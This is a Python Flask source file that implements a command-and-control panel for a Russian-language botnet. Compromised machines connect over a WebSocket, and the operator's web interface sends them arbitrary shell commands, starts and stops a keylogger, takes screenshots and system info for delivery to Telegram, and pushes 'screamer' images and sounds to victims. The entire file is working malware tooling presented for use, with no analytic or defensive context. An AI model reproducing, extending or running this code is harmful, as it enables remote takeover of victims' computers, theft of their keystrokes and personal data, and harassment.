import time
import threading
import os
import json
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)
bots, ws_map, command_results, volume_levels, events = {}, {}, {}, {}, {}
ALIASES_FILE = 'aliases.json'
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def load_aliases():
    path = os.path.join(BASE_DIR, ALIASES_FILE)
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            try: return json.load(f)
            except: return {}
    return {}

def save_aliases(data):
    with open(os.path.join(BASE_DIR, ALIASES_FILE), 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

aliases = load_aliases()
AUDIO_DIR = os.path.join(BASE_DIR, 'audio_files')
IMAGE_DIR = os.path.join(BASE_DIR, 'image_files')
os.makedirs(AUDIO_DIR, exist_ok=True)
os.makedirs(IMAGE_DIR, exist_ok=True)
audio_files = sorted([f for f in os.listdir(AUDIO_DIR) if os.path.isfile(os.path.join(AUDIO_DIR, f))])
image_files = sorted([f for f in os.listdir(IMAGE_DIR) if os.path.isfile(os.path.join(IMAGE_DIR, f))])

HTML_TEMPLATE = """
<!doctype html><html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>
    body{font-family:monospace;background-color:#1a1a1a;color:#0f0;margin:0;padding:20px}
    .container{width:95%;max-width:1200px;margin:auto}
    h1,h2,h3{text-align:center;border-bottom:1px solid #0f0;padding-bottom:10px}
    .control-block{margin-top:20px;padding:15px;border:1px solid #0f0;border-radius:5px}
    select,input[type=text]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;box-sizing:border-box}
    button{background-color:#0f0;color:#1a1a1a;padding:10px 15px;border:none;cursor:pointer;margin-right:10px;margin-top:5px;transition:background-color .2s}
    button:hover{background-color:#0c0}
    pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;max-height:300px;overflow-y:auto}
    input[type=range]{width:80%;vertical-align:middle}
    output{padding-left:10px}
    .media-gallery{display:flex;flex-wrap:wrap;gap:15px;justify-content:center;max-height:400px;overflow-y:auto;padding:10px;background-color:#000}
    .media-gallery img{width:120px;height:120px;object-fit:cover;border:2px solid #0f0;cursor:pointer;transition:transform .2s,border-color .2s}
    .media-gallery img:hover{transform:scale(1.1);border-color:#ff0}
    .audio-list{display:flex;flex-direction:column;gap:8px;max-height:250px;overflow-y:auto;padding-right:10px}
    .audio-item{background-color:#2a2a2a;padding:10px;cursor:pointer;border-left:4px solid #0f0;transition:background-color .2s}
    .audio-item:hover{background-color:#444}
    .keylogger-btn{background-color:#c00;color:#fff}
    .keylogger-btn:hover{background-color:#a00}
</style>
</head><body onload="initializePanel()">
<div class=container><h1>Панель управления v19 - Кейлоггер</h1><h2>Активные боты: {{ bots_list|length }}</h2>
{% if bots_list %}
    <div class=control-block><h3>Цель</h3><select id=main_bot_select onchange=onBotSelect()></select></div>
    <div class=control-block><h3>Редактор имени</h3><input type=text id=alias_input placeholder="Введите новый псевдоним цели..."><button onclick=renameBot()>Переименовать</button></div>
    <div class=control-block><h3>Галерея скримеров</h3><div class=media-gallery id=image_gallery></div></div>
    <div class=control-block><h3>Фонотека</h3><div class=audio-list id=audio_list></div></div>
    <div class=control-block><h3>Выполнение команд</h3><input type=text id=command_input placeholder="Введите команду..."><button onclick=sendShellCommand('command_input')>Отправить</button></div>
    <div class=control-block><h3>Управление звуком</h3><label for=volume_slider>Громкость:</label><br><input type=range id=volume_slider min=0 max=100 value=50 oninput="sendControlCommand('setvolume '+this.value)"><output id=volume_output>50%</output><br><br><button onclick=sendControlCommand('mute')>Mute</button><button onclick=sendControlCommand('unmute')>Unmute</button></div>
    <div class=control-block><h3>Кейлоггер</h3>
        <button onclick="sendShellCommand('start_keylogger')">Запустить запись</button>
        <button class="keylogger-btn" onclick="sendShellCommand('stop_keylogger')">Остановить и Отправить Лог</button>
    </div>
    <div class=control-block><h3>Специальные команды</h3><button onclick=sendShellCommand('sysinfo')>Получить инфо (в Telegram)</button><button onclick=sendControlCommand('screenshot')>Сделать скриншот (в Telegram)</button></div>
    <div class=control-block><h3>Результат последней команды</h3><pre id=result_output_pre>Ожидание команды...</pre></div>
{% else %}<p>Нет активных ботов.</p>{% endif %}</div>
<script>
    const BOTS={{bots_data|tojson}},IMAGE_FILES={{image_files|tojson}},AUDIO_FILES={{audio_files|tojson}};
    const mainBotSelect=document.getElementById("main_bot_select"),aliasInput=document.getElementById("alias_input"),resultOutput=document.getElementById("result_output_pre"),volumeSlider=document.getElementById("volume_slider"),volumeOutput=document.getElementById("volume_output"),imageGallery=document.getElementById("image_gallery"),audioList=document.getElementById("audio_list");
    function formatBotName(t,e){return`${t} - ${e.hostname||"..."} ${e.alias?": "+e.alias:""}`}
    function onBotSelect(){const t=mainBotSelect.value;aliasInput.value=BOTS[t].alias||"",localStorage.setItem("selectedBotId",t),getCurrentVolume()}
    function initializePanel(){if(!mainBotSelect)return;Object.entries(BOTS).forEach(([t,e])=>{let o=new Option(formatBotName(t,e),t);mainBotSelect.add(o)});const t=localStorage.getItem("selectedBotId");t&&BOTS[t]&&(mainBotSelect.value=t),IMAGE_FILES.forEach(t=>{let e=document.createElement("img");e.src=`/files/image/${t}`,e.title=t,e.onclick=()=>sendFileCommand("showimage",t),imageGallery.appendChild(e)}),AUDIO_FILES.forEach(t=>{let e=document.createElement("div");e.className="audio-item",e.textContent=t,e.onclick=()=>sendFileCommand("playsound",t),audioList.appendChild(e)}),mainBotSelect.options.length>0&&mainBotSelect.dispatchEvent(new Event("change"))}
    volumeSlider&&volumeSlider.addEventListener("input",()=>{volumeOutput.value=volumeSlider.value+"%"});
    async function sendCommand(t,e){const o=mainBotSelect.value;if(o)return e.bot_id=o,fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)})}
    async function sendControlCommand(t){sendCommand("/api/control",{command:t})}
    async function sendFileCommand(t,e){sendCommand("/api/control",{command:`${t} ${e}`})}
    async function sendShellCommand(t){let e="command_input"===t?document.getElementById("command_input").value:t;e&&(resultOutput.textContent="Выполнение...",sendCommand("/api/shell_command",{command:e}).then(t=>t.json()).then(t=>{resultOutput.textContent="ok"===t.status?t.result:`Ошибка: ${t.message}`}).catch(t=>{resultOutput.textContent=`Сетевая ошибка: ${t}`}))}
    async function getCurrentVolume(){try{const t=await sendCommand("/api/get_volume",{});if(t){const e=await t.json();"ok"===e.status&&(volumeSlider.value=e.volume,volumeOutput.value=`${e.volume}%`)}}catch(t){}}
    async function renameBot(){const t=aliasInput.value;try{await sendCommand("/api/rename",{alias:t}),location.reload()}catch(t){alert("Ошибка переименования!")}}
</script></body></html>
"""

# --- ИСПРАВЛЕННЫЙ БЭКЕНД С НОРМАЛЬНЫМИ ОТСТУПАМИ ---
@app.route('/files/<folder>/<filename>')
def serve_files(folder, filename):
    directory = AUDIO_DIR if folder == 'audio' else IMAGE_DIR if folder == 'image' else None
    if directory and os.path.exists(os.path.join(directory, filename)):
        return send_from_directory(directory, filename)
    return "Not Found", 404

@app.route('/api/get_file_lists')
def get_file_lists():
    return jsonify({'audio': audio_files, 'images': image_files})

@app.route('/')
def index():
    bots_for_template = {ip: {'hostname': data['hostname'], 'alias': data.get('alias', '')} for ip, data in bots.items()}
    return render_template_string(HTML_TEMPLATE, bots_list=list(bots.keys()), bots_data=bots_for_template, image_files=image_files, audio_files=audio_files)

@app.route('/api/rename', methods=['POST'])
def api_rename():
    data = request.get_json()
    bot_id = data.get('bot_id')
    new_alias = data.get('alias')
    if bot_id:
        aliases[bot_id] = new_alias
        save_aliases(aliases)
        if bot_id in bots:
            bots[bot_id]['alias'] = new_alias
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@app.route('/api/shell_command', methods=['POST'])
def api_shell_command():
    data = request.get_json()
    bot_id = data.get('bot_id')
    cmd = data.get('command')
    if not (bot_id and cmd and bot_id in bots):
        return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
    try:
        ws = bots[bot_id]['ws']
        if bot_id in command_results:
            del command_results[bot_id]
        ws.send(cmd)
        for _ in range(600):
            if bot_id in command_results:
                return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
            time.sleep(0.1)
        return jsonify({'status': 'error', 'message': 'Бот не ответил за 60 секунд.'}), 408
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/control', methods=['POST'])
def api_control():
    data = request.get_json()
    bot_id = data.get('bot_id')
    cmd = data.get('command')
    if not (bot_id and cmd and bot_id in bots):
        return jsonify({'status': 'error', 'message': 'Неверный запрос или бот не найден'}), 400
    try:
        bots[bot_id]['ws'].send(cmd)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/get_volume', methods=['POST'])
def api_get_volume():
    bot_id = request.json.get('bot_id')
    if not (bot_id and bot_id in bots):
        return jsonify({'status': 'not_found'}), 404
    try:
        events[bot_id] = threading.Event()
        bots[bot_id]['ws'].send('getvolume')
        if events[bot_id].wait(timeout=3):
            volume = volume_levels.get(bot_id, 50)
            return jsonify({'status': 'ok', 'volume': volume})
        else:
            return jsonify({'status': 'timeout'}), 408
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@sock.route('/ws')
def websocket_handler(ws):
    bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
    try:
        first_message = ws.receive(timeout=10)
        if first_message.startswith("HOSTNAME:"):
            hostname = first_message.split(":", 1)[1]
        else:
            hostname = "unknown_host"
    except Exception:
        hostname = "timeout_host"
        ws.close()
        return

    bots[bot_ip] = {'ws': ws, 'hostname': hostname, 'alias': aliases.get(bot_ip, '')}
    ws_map[ws] = bot_ip
    print(f"[+] Новый бот: {bot_ip} ({hostname})")
    try:
        while True:
            result = ws.receive()
            current_bot_ip = ws_map.get(ws)
            if not current_bot_ip:
                continue
            if result.startswith('VOL_LEVEL:'):
                level_str = result.split(':')[1]
                if level_str.isdigit():
                    volume_levels[current_bot_ip] = int(level_str)
                if current_bot_ip in events and not events[current_bot_ip].is_set():
                    events[current_bot_ip].set()
            else:
                command_results[current_bot_ip] = result
    except Exception:
        dead_bot_ip = ws_map.pop(ws, None)
        if dead_bot_ip and dead_bot_ip in bots:
            del bots[dead_bot_ip]
        print(f"[-] Бот {dead_bot_ip or 'unknown'} отвалился.")

if __name__ == '__main__':
    print("Этот скрипт не предназначен для прямого запуска.")
